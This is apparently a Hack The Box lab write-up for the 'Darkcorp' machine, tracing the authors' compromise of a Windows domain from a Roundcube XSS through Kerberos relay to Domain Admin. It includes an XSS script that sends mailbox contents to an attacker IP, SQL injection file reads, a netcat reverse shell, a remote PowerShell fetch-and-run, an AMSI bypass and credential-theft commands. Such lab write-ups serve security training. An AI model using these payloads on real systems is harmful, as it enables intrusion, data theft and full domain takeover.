---
title: "HTB - Darkcorp - Insane"
published: 2025-06-01
description: HTB Darkcorp box writeup
tags: [write-up, HTB, AD, Kerberos, Active Directory, Web , Relay]
image: /images/htb_darkcorp/logo.png
category: Write-Ups
draft: false
---

---

We got rid of the box and wrote this write-up together with my friend [Wuentin](https://x.com/wuentin_?s=11). Don't hesitate to go see his work.

---

# Recap

Darkcorp was a very challenging box. The environment deals with a lot of concepts and modern attack, from **recent CVE** exploitation to modern **Kerberos attack**.

To get the initial foothold, a Roundcube **XSS** CVE was exploited to leak the emails of the user `bcase`. His password was reset on the discovered vhost and the resetting link was leaked via the same **XSS** flaw. On the `dev` vhost, a SQL injection was leveraged to leak `ebelford`'s password, which was used to connect to the host through the SSH protocol.

On the linux host, a previously found password was used to connect to the postgresql database and to send a **reverse shell** via the **postgresql** prompt. This shell as the postgres user was used to find the password of the `victor.r` domain user which was held in an gpg encrypted backup file.

As `victor.r` is authorized to connect to a web application on `WEB-01$` host, we weaponized the application to **NTLM relay** the `svc_acc` user back to the attacker machine. The presence of `svc_acc` into the DNS Admins group was used to perform a **Kerberos relay attack** to compromise the WEB-01$ host using **ESC8**. On this machine, credentials was found, belonging to the user `john.w`. This user was used to perform a shadow credentials attack on `angela.w`. As Linux only verify the UPN contained in a TGT, if the principal type of the ticket is marked as `NT_ENTEPRISE`, a UPN manipulation can be conducted to impersonate and connect as `taylor.b.adm` on the linux host.

The password of `taylor.b.adm` was then found on the host. It was finally used to exploit a GPO fully controlled by  `taylor.b.adm` in order to compromise the domain controller, and thus, the whole domain.

# Port scan

```sh
$ nmap -p- -T5 -Pn -n

Nmap scan report for 10.10.11.54
Host is up (0.025s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 3341ed0aa51a86d0cc2aa62b8d8db2ad (ECDSA)
|_  256 04ad7eba110ee0fbd080d324c23e2cc5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The TCP port scan reveals two exposed services : SSH and HTTP.

# Drip.htb web application
## Recon

When connecting to the web app, we are redirected on the **drip.htb** domain.
```sh
$ curl 10.10.11.54 -v                       

[...]
<meta http-equiv="refresh" content="0; url=http://drip.htb/" />
```

![image ](/images/htb_darkcorp/1.png)

First, we can create an account by clicking on the "Sign Up" button, which is moving us to the http://drip.htb/register page.

![image ](/images/htb_darkcorp/2.png)

Then, we can click on the "Sign In" button in order to login, which will move us to a roundcube instance located on the mail.drip.htb subdomain.

![image ](/images/htb_darkcorp/3.png)


The other interesting and working feature located on the http://drip.htb/index page is the contact form present at the bottom (let's talk about it later for the sake of the narrative).

Once logged into the roundcube with the previously created account, there are a few interesting things to see before reaching to offensive actions.
* First, we can see the version of the instance, actually the **1.6.7**, by clicking on the "About" button at the bottom left hand corner. This version is known as vulnerable to **multiple CVE**.
![image ](/images/htb_darkcorp/4.png)
* When creating the account at first, it is possible to create the user named **root**. This will make roundcube to display the mails that root is receiving (/var/mail/root on the linux host). These leaks are revealing the presence of the users **ebelford** and **support** on the host.
![image ](/images/htb_darkcorp/5.png)


## information leak using the contact form
As we said earlier, the main page contains a contact form. Below the HTTP POST body sent to the server once submitting the form :
![image ](/images/htb_darkcorp/6.png)


```
name=test&email=test@test.fr&message=test&content=text&recipient=support@drip.htb
```
In clear, the client can specify the mail of the recipient as the displaying format of the mail. By default, the contact forms are sent via email to **support@drip.htb** and on a text displaying format.

But what happens if we put our (new) mail into the recipient ?

```sh
$ curl -X POST drip.htb/contact -d
'name=test&email=test%40%C5%A7est.fr&message=test&content=text&recipient=test%40drip.htb'

<!doctype html><html lang="en"> <title>Redirecting...</title> <h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL:
<a href="index#contact">index#contact</a>. If not, click the link.
```

We are receiving an email containing a phishing awareness message :
![image ](/images/htb_darkcorp/7.png)


This leaks another user, at least of the mail solution : **bcase@drip.htb** (keep it in mind)

## Email leak using the CVE-2024-42009
if we try to send a classic XSS payload into the mail, specifying the content is HTML, here is the result :
```sh
$ curl -X POST drip.htb/contact -d
'name=test&email=test%40%C5%A7est.fr&message=<script>alert(1)</script>&content=html&recipient=test%40drip.htb'

<!doctype html><html lang="en"> <title>Redirecting...</title> <h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL:
<a href="index#contact">index#contact</a>. If not, click the link.
```
![image ](/images/htb_darkcorp/8.png)
![image ](/images/htb_darkcorp/9.png)


Fortunately, this roundcube instance is outdated, indeed, the version 1.6.7 is vulnerable to the following CVEs :
* CVE-2024-42008
* CVE-2024-42009
* CVE-2024-42010

After a few tests, none of these vulnerabilities seems to work unless the **CVE-2024-42009**.

An example of payload made for the **CVE-2024-42009** is as follow :
```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(`xss`) foo=bar>
```

:::info
The missing quote after the "bar" string willl make roundcube think that all the string after "bar" is part of the name parameter, which will help us to bypass the tags/attribute restrictions. But when the content will be displayed on the web UI, the closing quote will be placed at the first (and not the last) white-space location, here the first space after "bar".

This will cause the body attribute to also have a "style" and a "onanimationstart" parameter, which will trigger the XSS.

Inside the "onanimationstart" parameter, we can see the JavaScript malicious code that we will use to extract the informations contained in the victim's mailbox (e.g. ebelford or bcase).
:::

Let's test it !

```sh
curl -X POST drip.htb/contact -d /
'name=test&email=test%40%C5%A7est.fr&message=<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(1) foo=bar>&content=html&recipient=test%40drip.htb'
```

when we open the mail :
![image ](/images/htb_darkcorp/10.png)

## Leaking bcase's emails
The PoC can be easily weaponized after that to leak the content of the victim's mails.

We tried with all the users, but only bcase has interesting things to see into it's mailbox.

In order to leak the html content of an email, we'll have to make the victim open a link and leak the result's content. To see a single mail on roundcube, a link as follow can be crafted : `http://mail.drip.htb/?_task=mail&_action=show&_uid=<UID>&_mbox=INBOX`. the UID identifies an email stored in the mailbox, it begins at 0.

The exploit is as follow :
```python
import requests

IP="10.10.14.130"
PORT="4444"

for ID in range(0, 20):
    pld = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes'
    pld += f" onanimationstart=fetch(`/?_task=mail&_action=show&_uid={ID}&_mbox=INBOX"
    pld += f"`).then(r=>r.text()).then(t=>fetch(`http://{IP}:{PORT}/?"
    pld += "c=${btoa(t)}`)) foo=bar>"

    print(pld)
    data = {
        "name": "test",
        "email": "test@test.fr",
        "message": pld,
        "content": "html",
        "recipient": "bcase@drip.htb"
    }

    requests.post("http://drip.htb/contact", data=data)
```

This will trick bcase to send us the content of it's 20 first emails encoded in base64 :
![image ](/images/htb_darkcorp/11.png)

Here is an interesting one, sent to bcase from the ebelford user :
![image ](/images/htb_darkcorp/12.png)

As we can see, this reveals another subdomain : **dev-a3f1-01.drip.htb**

# Shell as ebelford

The Analytics dashboard's first page is a login form
![image ](/images/htb_darkcorp/13.png)

This seems like the drip.htb signup page but we can't login with the previously created accounts.

The password reset function is a bit too talkative concerning authorized/unauthorized accounts on the plateform. the bcase account seems the only authorized.

Below an example with `test@drip.fr` :
![image ](/images/htb_darkcorp/14.png)

Below with the email `bcase@drip.htb`
![image ](/images/htb_darkcorp/15.png)

Since it sent an email to bcase... let's leak it with the precedent exploit !

It was hard to leak a specific email, since many people were trying too on the same box, we used a noisy technique which consists in sending multiple reset emails (around 20) and leak the 40 to 50 first emails.
![image ](/images/htb_darkcorp/16.png)

Here it is. Thanks to this link, it is possible to reset bcase's password.
![image ](/images/htb_darkcorp/17.png)

Using bcase account, we can access the analytics board. The main feature of this subdomain seem to enumerate Users with their username.
![image ](/images/htb_darkcorp/18.png)

If a single quote (') is put into the search field, we have an SQL error.
![image ](/images/htb_darkcorp/19.png)

After a few researches, we can deduce the SGBD is postgresql. Furthermore, here is an example payload that can be used to list the content of a directory on the host (precisely the /var/www/html directory). Special mention to the double single quotes to put at the beginning. If unmet, the SQL injection fails.

```sql
''; SELECT * from pg_ls_dir('/var/www/html/');
```
![image ](/images/htb_darkcorp/20.png)


After a few enumeration, we first found an interesting file : `/var/www/html/dashboard/.env`

This file can be read with the pg_read_file postgres primitive.

```sql
''; SELECT pg_read_file('/var/www/html/dashboard/.env');
```
![image ](/images/htb_darkcorp/21.png)


The file reveals a connection URL, and thus, a password. This will be useful for an other part of this WU.

```
dripmail_dba:2Qa2SsBkQvsc
```

After a (*way more*) larger enumeration of the system, we found the directory that holds postgresql log files: /var/log/postgresql.
Again, with the pg_ls_dir primitive, it is possible to list it's content.

```sql
''; SELECT * from pg_ls_dir('/var/log/postgresql');
```
![image ](/images/htb_darkcorp/22.png)


In order to download the .gz files, we have to combien the pg_read_binary_file primitive, which can read bytelike files (instead of text/ASCII file read with pg_read_file) with the encode primitive in order to get an hexdump of the file.

The more interesting one was the /var/log/postgresql/postgresql-15-main.log.2.gz.

```sql
''; SELECT encode(pg_read_binary_file('/var/log/postgresql/postgresql-15-main.log.2.gz'), 'hex');
```
![image ](/images/htb_darkcorp/23.png)


After a quick rollback from hexdump to the original file (`xxd -r -p`), we have found the md5 hash of the ebelford user's password inside.
![image ](/images/htb_darkcorp/24.png)


It needed a few seconds to be cracked with [John the Ripper](https://www.openwall.com/john/) and the rockyou.txt wordlist
![image ](/images/htb_darkcorp/25.png)

```sh
sshpass -p ThePlaXXXXXXXX ssh ebelford@drip.htb
```
![image ](/images/htb_darkcorp/26.png)


# Compromission of the WEB-01$ host

## Compromission of victor.r
Once on the linux host as `ebelford`, we can use the dripmail_dba account found earlier to connect to the local dripmail database.

```sh
psql -U dripmail_dba -h localhost dripmail

... prompted password
```

Once into the postgresql shell, a reverse shell can be sent toward our attacker IP, which will give us a shell as the postgres user

```sql
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/e;cat /tmp/e|sh -i 2>&1|nc <IP> <PORT> >/tmp/e';
```

The postgres user can read various new interesting files. The most interesting is the one called `/var/backups/postgres/dev-dripmail.old.sql.gpg`.

This file is a gpg encrypted file. Lucky us, we already have loaded key as the postgres user and it's the key that encrypted the precious file.
![image ](/images/htb_darkcorp/27.png)


We can decipher the file using the following command as postgres :

```sh
gpg --use-agent --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
```

Looking into the SQL file reveals a few a Admin table with 3 users :
![image ](/images/htb_darkcorp/28.png)

The hash of the user victor can be cracked with [John the Ripper](https://www.openwall.com/john/)
![image ](/images/htb_darkcorp/29.png)

## Pivoting through the linux host
Enumerating network interfaces on the linux host reveals the internal subnet CIDR `172.16.20.0/24` 
![image ](/images/htb_darkcorp/30.png)

A quick ping sweep can be done to check other hosts :
```sh
for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done
```
![image ](/images/htb_darkcorp/31.png)

The following hosts seems to be up :
* 172.16.20.1
* 172.16.20.2
* 172.16.20.3 (the current linux host)

to reach them, we can create use the [ligolo-ng](https://github.com/nicocha30/ligolo-ng) tools to create a reverse TCP tunnel.

On the attacker host, we launch the ligolo server and create a virtual network interface, waiting for a connection :
![image ](/images/htb_darkcorp/32.png)

On the linux drip host, we download the agent and launch connect it to the server :
![image ](/images/htb_darkcorp/33.png)

Back to the attacker host, we start the session on the previously created virtual interface and create a route which indicate that all the request to the darkcorp subnet must pass through this interface.
![image ](/images/htb_darkcorp/34.png)

```sh
ip r add 172.16.20.0/24 dev darkcorp
```

After all that, you should be able to ping the other hosts, .1 and .2, from our attack machine.
![image ](/images/htb_darkcorp/35.png)

We can now test the previously found creds for the user victor.r using [NetExec](https://github.com/Pennyw0rth/NetExec).
![image ](/images/htb_darkcorp/36.png)

Indeed, victor.r is a user of the darkcorp.htb which domain controller is the DC-01 host (172.16.20.1).

## Kerberos Relay attack
Victor can login to 172.16.20.2:5000 using HTTP authentication :
![image ](/images/htb_darkcorp/37.png)

This website monitors the status of the domain's servers.
![image ](/images/htb_darkcorp/38.png)

Exploiting this functionality allows for the svc_acc service account's authentication to be forced towards an attacker-controlled machine.

```sh
curl 172.16.20.2:5000/check -d '{"protocol":"https","host":"172.16.20.3","port":"8082"}'
-H 'Content-Type: application/json' -H 'Authorization: NTLM <BASE64>'

curl -X POST http://172.16.20.2:5000/status -H 'Content-Type: application/json'
-d '{"protocol":"http","host":"drip.darkcorp.htb","port":"8082"}' -v --ntlm
-u darkcorp.htb/victor.r:'victoXXXXXXXXXXX'
```

The process involves redirecting traffic to `172.16.20.3` (the previously referenced Linux machine) and subsequently forwarding port 8082 from the Linux host to the attack machine. We can do it with the [socat](https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/) tool.
![image ](/images/htb_darkcorp/39.png)

The NTLM authentication of the `svc_acc` account can then be relayed and transitioned to the LDAP protocol, given that LDAPS is not required. It's important to note that this user account possesses no specific privileges apart from its membership in the DNSAdmins group.
![image ](/images/htb_darkcorp/40.png)
![image ](/images/htb_darkcorp/41.png)
![image ](/images/htb_darkcorp/42.png)

Active Directory Certificate Services (ADCS) is configured on the Domain Controller. While the Web Enrollment feature is available, NTLM authentication for it has been disabled. Kerberos authentication, however, remains active.
![image ](/images/htb_darkcorp/43.png)

```sh
curl https://dc-01.darkcorp.htb/DARKCORP-DC-01-CA_CES_Kerberos/service.svc/CES -v -k
```
![image ](/images/htb_darkcorp/44.png)

:::note
Negotiate flag indicates that only Kerberos authentication is supported :

![image ](/images/htb_darkcorp/45.png)

WWW-Authenticate header documentation: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/WWW-Authenticate
:::

![image ](/images/htb_darkcorp/46.png)

Given that this account (`svc_acc`) is a **DNS Admin**, we can potentially manipulate DNS entries to perform Kerberos relay attack.

### Exploiting SPN Marshaling for ADCS Abuse
The attack leverages the SPN marshaling behavior to relay Kerberos authentication to Active Directory Certificate Services (ADCS) and ultimately compromise the `WEB-01$` machine account.

If you want more details, here are some good references:
* https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
* https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
* https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx
* https://www.thehacker.recipes/ad/movement/kerberos/relay

### Setting up the Malicious DNS Record and Relay
Our attack begins by leveraging the previously discussed SSRF vulnerability in the server monitoring website (`172.16.20.2:5000`). This SSRF allows us to coerce an authentication from the `svc_acc` account.

Like we said previously, `svc_acc` is a member of the DNSAdmins group, and we will create a malicious DNS entry using ntlmrelayx :
```sh
ntlmrelayx -smb2support -t ldap://172.16.20.1 --http-port 8082 --add-dns-record dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <attacker_ip>
```

Now, let's discuss why such an unusual DNS hostname, like (dc-011UWhRCA...) is created. This is directly related to the behavior of SPN marshaling.

As a recap of SPN marshaling mechanics: Windows can store additional metadata within an SPN. It does this by encoding a bytelike structure into a Base64 string (using CredMarshalTargetInfo) and appending it to the SPN. During authentication, when Windows (specifically lsass.exe) calls CredUnmarshalTargetInfo, it doesn't actually use the unmarshaled metadata from this appended string. Instead, it simply removes this marshaled portion and uses the restored, original SPN (e.g., http/fileserver). 

We can exploit this behavior where Windows ignores the unmarshaled data and just strips it.

Deconstructing our malicious DNS Hostname, the hostname dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA is crafted with two parts:
1. `dc-01`: This is the actual, legitimate name of the target server 
2. `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`: This is the marshaled SPN data. It's a string formatted to appear as valid empty marshaled data.

This entire crafted hostname (`dc-011UWhRCA...`) is made to resolve to `<attack_ip>` (the attacker's machine).
![image ](/images/htb_darkcorp/47.png)


### Authentication Coercion and Kerberos Relay to ADCS

**TL;DR**

The malicious DNS entry allows the initial authentication to be directed to the attacker, while the SPN unmarshaling mechanism ensures that the obtained Kerberos ticket is valid for the actual target (dc-01). This ticket is then relayed to ADCS to obtain a certificate for machine account WEB-01$.

#### Forcing Authentication to the Attacker's Machine
The first step is to force a victim machine, in this case, `WEB-01$` to initiate Kerberos authentication, this can be done using the tool [PetitPotam](https://github.com/topotam/PetitPotam) :
![image ](/images/htb_darkcorp/48.png)


#### Relaying the AP-REQ to ADCS
The WEB-01$ machine, now possessing a valid service ticket for dc-01, attempts to send its authentication request (the AP-REQ, which includes this service ticket) to what it believes is dc-011UWhRCA.... However, this traffic is routed to the attacker's machine.

We have coerce authentication from the machine account WEB-01$ to our attacker machine.

The WEB-01$ client will generate an SPN based on the malicious DNS entry :
```
HTTP/dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Using krbrelayx, we will forward authentication to the KDC (DC-01).

When CredUnmarshalTargetInfo is called (on the KDC when processing it), Windows encounters the 1UWhRCA... part. It recognizes this as marshaled data. As per the SPN marshaling behavior, and as explained above, this part will be removed.

The final SPN used for the Kerberos ticket request to the KDC becomes : 
```
HTTP/dc-01
```

While the Kerberos service ticket obtained is valid for services on the legitimate dc-01 server (and authenticated as WEB-01$), the WEB-01$ client is actually sending its authentication attempt (the AP-REQ containing this ticket) to the hostname dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA. 

Since this resolves to the attacker's IP, the authentication lands on the attacker-controlled machine.

By relaying this valid Kerberos authentication from WEB-01$, we can impersonate WEB-01$ to the ADCS Web Enrollment service and request a certificate in WEB-01$'s name.
```sh
krbrelayx -t https://dc-01.darkcorp.htb/certsrv/certfnsh.asp --adcs -v "WEB-01$"
```
![image ](/images/htb_darkcorp/49.png)

#### Exploit WEB-01$ certificate
With this certificate (e.g., `WEB-01$.pfx`) and [certipy](https://github.com/ly4k/Certipy), we can retrieve the NTLM hash of the `WEB-01$` machine account using Kerberos PKINIT :

```sh
certipy auth -pfx 'WEB-01$.pfx' -dc-ip 172.16.20.1
```
![image ](/images/htb_darkcorp/50.png)

With control over the machine account `WEB-01$`, we can now leverage a Resource-Based Constrained Delegation (**RBCD**) attack. 

This is possible because machine accounts have the necessary permissions to edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute in Active Directory.
```sh
rbcd.py -delegate-from 'web-01$' -delegate-to 'web-01$' -dc-ip '172.16.20.1' -action 'write' 'darkcorp.htb'/'web-01$' -hashes :8f33c7fc7ff515c1f358e488fbb8b675
```
![image ](/images/htb_darkcorp/51.png)

Now we can impersonate the Administrator account on the WEB-01 machine using Impacket's [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py) tool :
```sh
getST -spn cifs/web-01.darkcorp.htb -impersonate Administrator -dc-ip 172.16.20.1 'darkcorp.htb'/'web-01$' -hashes :8f33c7fc7ff515c1f358e488fbb8b675
```
![image ](/images/htb_darkcorp/52.png)

And we can authenticate as Administrator on the machine
```sh
export KRB5CCNAME=./Administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
nxc smb 172.16.20.2 -k --use-kcache 
```
![image ](/images/htb_darkcorp/53.png)

# Compromission of the domain
## john.w password leak
We can use Netexec to dump the DPAPI encrypted credentials stored on `WEB-01` :
![image ](/images/htb_darkcorp/54.png)

The local administrator's password can be found in a scheduled task.

Other credentials stored using DPAPI encryption can be found on `WEB-01`, but this time they need manual extraction.
![image ](/images/htb_darkcorp/55.png)
![image ](/images/htb_darkcorp/56.png)

* MasterKey : `\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500\6037d071-cac5-481e-9e08-c4296c0a7ff7`

* Encrypted credentials : `\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E`

We can decrypt the masterkey with the administrator's password that we found previously :
```sh
dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500
-hashes :88d84ec08daXXXXXXXXXXXXXXXXXXXXXX -password 'But_XXXXXXXXXXXX'
```
![image ](/images/htb_darkcorp/57.png)

And finally, decrypt the data protected by DPAPI using the master key :
```sh
dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E
-key 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da
```
![image ](/images/htb_darkcorp/58.png)

And we find a new password: Pack_XXXXXXXXXXXXXXX`
We will use **netexec** to generate a **user wordlist**.
![image ](/images/htb_darkcorp/59.png)
![image ](/images/htb_darkcorp/60.png)


Then, we will perform a **password spray attack**:

And we can find that the password found belongs to `john.w`.
![image ](/images/htb_darkcorp/61.png)

## Compromission of angela.w

![image ](/images/htb_darkcorp/62.png)
Since `john.w` has GenericWrite permissions over `angela.w`, a shadow credentials attack can be performed, allowing retrieval of `angela.w`'s NT hash :
![image ](/images/htb_darkcorp/63.png)

## Compromission of taylor.b.adm
Since `john.w` has a GenericWrite permission over the user `angela.w`, he can overwrite her UPN and set it to `taylor.b.adm`. The ommission of the `@darkcorp.htb` is important because otherwise it won't work.
![image ](/images/htb_darkcorp/64.png)

As we know the `angela.w`'s NT hash, we can ask a TGT for `taylor.b.adm`, specifiying the principal type as ENTERPRISE (`NT_ENTERPRISE`).
![image ](/images/htb_darkcorp/65.png)

The following explanation is what we understood of the following article :https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/

From the Active Directory point of view, this TGT won't allow us to act as `taylor.b.adm` because the KDC is verifying other parameters than the UPN (SID, samaccountname, etc).

Nervertheless, as the principal type of the TGT is specified as **ENTERPRISE**, linux will **only check the UPN** to bind the ticket with the remote user.

As we modified the `angela.w` UPN to be `taylor.b.adm`, the ticket can be used to log as `taylor.b.adm` on `drip.darkcorp.htb` (the linux host) through the SSH protocol using the GSSAPIAuthentication (Kerberos).

:::note
This only work because `taylor.b.adm` is allowed to log with that protocol on the linux host at first.
:::

Connection to drip.darkcorp.htb as `taylor.b.adm` :
![image ](/images/htb_darkcorp/66.png)

Once logged on the host as `taylor.b.adm`, we can read an interesting new file : `/var/lib/sss/db/cache_darkcorp.htb.ldb` which contains a sha512crypt hash.
![image ](/images/htb_darkcorp/67.png)

This hash can be cracked with [John the Ripper](https://www.openwall.com/john/) to reveal the `taylor.b.adm`'s password.
![image ](/images/htb_darkcorp/68.png)

This password can then be verified on the Domain Controller SMB service :
![image ](/images/htb_darkcorp/69.png)

## Road to Domain Admin
taylor.b.adm has the rights to use WinRM on the Domain Controller.
```sh
evil-winrm -u taylor.b.adm -p '!QAXXXXX' -i 172.16.20.1 
```

Next, since we have control over the `SECURITYUPDATES` GPO, we can modify it to add ourselves to the `Administrators` group. We could also have installed a backdoor or reverse shell to gain root access to the domain controller.
![image ](/images/htb_darkcorp/70.png)

:::warning
Note that Defender is enabled, but we can use the Bypass-4MSI module from Evil-WinRM to patch AMSI and ETW.
:::
![image ](/images/htb_darkcorp/71.png)

```powershell
IEX(New-Object Net.webClient).downloadString('http://<ip>:8000/PowerGPOAbuse.ps1')
```

Then we use Invoke-SharpGPOAbuse to make the GPO create a local administrator account.
```powershell
Invoke-SharpGPOAbuse "--AddLocalAdmin --UserAccount taylor.b.adm --GPOName SECURITYUPDATES"
```

With the use of `gpupdate /force`, we are forcing the GPO to apply immediately, rather than waiting an hour or more.
![image ](/images/htb_darkcorp/72.png)

:::note
By default, Group Policy is periodically refreshed, and this periodic refresh is performed every 90 minutes with a randomized offset of up to 30 minutes - 5 minutes for Domain Controllers
:::

Finally, we can dump the NTDS using the recently created local administrator account to compromise the entire domain.
![image ](/images/htb_darkcorp/73.png)

---

Thanks for reading :)))

3C4D x Wuentin
